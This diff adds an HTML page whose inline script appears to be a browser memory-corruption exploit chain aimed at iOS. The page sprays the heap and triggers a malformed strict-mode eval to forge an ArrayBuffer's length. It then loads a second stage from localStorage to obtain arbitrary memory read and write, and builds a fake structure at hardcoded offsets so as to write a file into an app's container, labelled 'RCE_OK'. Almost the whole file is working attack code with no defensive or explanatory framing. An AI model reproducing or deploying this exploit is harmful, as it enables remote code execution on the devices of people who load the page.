@@ -1,0 +1,47 @@
+<!doctype html><html><head><meta charset="utf-8"></head><body>
+<div id="v">X</div>
+<script>"use strict";
+var N=3000,H=200,HN=64,VK=598;
+var PAT=[0,0,0,0,1,0,0,0,255,255,0,0,255,255,255,255,255,255,255,255,255,255,255,255,1,0,0,0,255,255,255,255,255,255,255,255,255,255,255,255];
+if (globalThis.PAT !== PAT) {
+  globalThis.RESULT="RESULT NO_TOPS";
+  try{document.getElementById("v").textContent=globalThis.RESULT;}catch(e){}
+} else {
+var S=new Array(N),fb=new Uint8Array(40);
+for(var j=0;j<40;j++)fb[j]=PAT[j];
+for(var i=0;i<N;i++){var u=new Uint8Array(957);S[i]=u;}
+for(var k=0;k<HN;k++)S[H+k]=null;
+globalThis.f=(0,eval)('"use strict";(function ([] = eval("(")) { var q1=0,q2=0,q3=0; return 1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5; })');
+var D=new Array(800);for(var i=0;i<800;i++)D[i]=new ArrayBuffer(64);
+var TN=600,T=new Array(TN),TV=new Array(TN);
+for(var i=0;i<TN;i++){T[i]=new ArrayBuffer(72);TV[i]=new Uint8Array(T[i]);}
+var PH=[4,12,20,28,36],VKS=[598,598-10,598-20,598-30,598-40];
+var hit=-1,len=0,ph=-1,vk=-1,nt=0;
+for(var pi=0;pi<5&&hit<0;pi++){
+  var p=PH[pi];
+  for(var i=0;i<N;i++){if(S[i]){for(var o=p;o+40<=957;o+=40)S[i].set(fb,o);}}
+  for(var vi=0;vi<5&&hit<0;vi++){
+    var v=VKS[vi]; if(v<16) continue;
+    for(var r=0;r<8;r++){var j=v-2*r;T[j]=null;TV[j]=null;}
+    try{f();}catch(e){}
+    nt++;
+    for(var i=0;i<TN;i++){if(T[i]!==null&&T[i].byteLength!==72){hit=i;len=T[i].byteLength;ph=p;vk=v;break;}}
+  }
+}
+if(hit>=0){globalThis.AB=T[hit];globalThis.ABV=TV[hit];globalThis.N1LEAK="FORGED";}
+globalThis.RESULT="RESULT LS C=34 SZ=957 N=3000 H=200 HN=64 HIT="+hit+" LEN="+len+" PH="+ph+" VK="+vk+" NT="+nt;
+globalThis.N1MARK=globalThis.RESULT;
+try{document.getElementById("v").textContent=globalThis.RESULT;}catch(e){}
+try{console.log("N1A:"+globalThis.RESULT);}catch(e){}
+var s2=null; try{s2=localStorage.getItem("n1s2");}catch(e){}
+globalThis.RESULT += " S2LEN=" + (s2===null ? -1 : s2.length);
+if(hit>=0 && s2){
+ try{var UB=new Uint8Array(2048);for(var j=0;j<2048;j++)UB[j]=0;UB[0x400]=0x88;UB[0x401]=0x77;UB[0x402]=0x66;UB[0x403]=0x55;UB[0x404]=0x44;UB[0x405]=0x33;UB[0x406]=0x22;UB[0x407]=0x11;globalThis.UB=UB;}catch(e0){}
+ try{s2=s2.replace('i("IOS_N1_OK','globalThis.R=_;globalThis.W=h;globalThis.D=b;globalThis.U=d;globalThis.F=S;globalThis.B=T;globalThis.Y=y;globalThis.X=a;globalThis.M=i;globalThis.K=c;i("IOS_N1_OK');(0,eval)(s2);}catch(e2){}
+ try{if(globalThis.U){!function(){var f=B,n=(F,_),r=D,i=R,a=W,t=(Y,X),x=M,c=K,e=i(f+0x69091f8n);if(c(e)){var o=e+0x296b394cn,v=e+0x296b3738n,g=e+0x4a21a474n,l=f+0x3292cn,I=f+0x172d96cn,U=f+0x628a2cn,b=e-0x66cccfcn,s=0x1122334455667788n,u=globalThis.UB;if(u){Q(u,1024,s);var C,_=0n;for(C=r;C<r+65536n;C+=8n){if(2048n===(0xffffffffn&i(C))){var A=i(C+16n),h=0x00ffffffffffffffn&A;if(h>0x10000n&&h<0x0001000000000000n&&0n===(7n&A))try{if(i(A+0x400n)===s){_=A;break}}catch(f){}}}if(0n===_)for(C=r-8n;C>r-65536n;C-=8n){if(2048n===(0xffffffffn&i(C))){var E=i(C+16n),N=0x00ffffffffffffffn&E;if(N>0x10000n&&N<0x0001000000000000n&&0n===(7n&E))try{if(i(E+0x400n)===s){_=E;break}}catch(f){}}}if(0n!==_){for(var d='/private/var/mobile/Containers/Data/Application/00000000-0000-0000-0000-000000000000/Documents/rce.txt',m='RCE_OK\n',p=S(103),y=S(p+7+1),O=y+64,T=O+64,k=T+64,w=k+64,H=0;H<w;H++)u[H]=0;for(var P=0;P<102;P++)u[0+P]=255&d.charCodeAt(P);for(var j=0;j<7;j++)u[p+j]=255&m.charCodeAt(j);u[y+16]=1,u[y+17]=6,u[y+24]=164,u[y+25]=1,Q(u,O+40,_+BigInt(0)),Q(u,T+16,_+BigInt(p)),u[T+24]=7;for(var q=new Uint8Array(1024),z=0;z<1024;z++)q[z]=0;Q(q,8,_+BigInt(O)),Q(q,16,I),Q(q,24,_+BigInt(y)),Q(q,184,_+BigInt(O)),Q(q,208,o),Q(q,224,U),Q(q,240,I),Q(q,248,_+BigInt(T)),Q(q,272,l),Q(q,416,v),Q(q,448,l),Q(q,584,_+BigInt(k)),Q(q,608,g),Q(q,624,U),x('U_RDY '+t(_)+' PATH='+d);var G=n+32n,J=n+48n,L=n+64n;a(n+16n,l),a(L,0n),a(G,b),a(J,0xffffffffffffffffn),q=null,x('U_AFTER')}else x('U_NF D='+t(r))}else x('U_NOUB')}else x('U_NO_FREE');function Q(f,n,r){for(var i,a=(i=r,BigInt.asUintN(64,i)),t=0;t<8;t++)f[n+t]=Number(a>>BigInt(8*t)&0xffn)}function S(f){return f+7&-8}}();}}catch(e3){}
+}
+
+}
+</script>
+</body></html>
+<!--CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-->
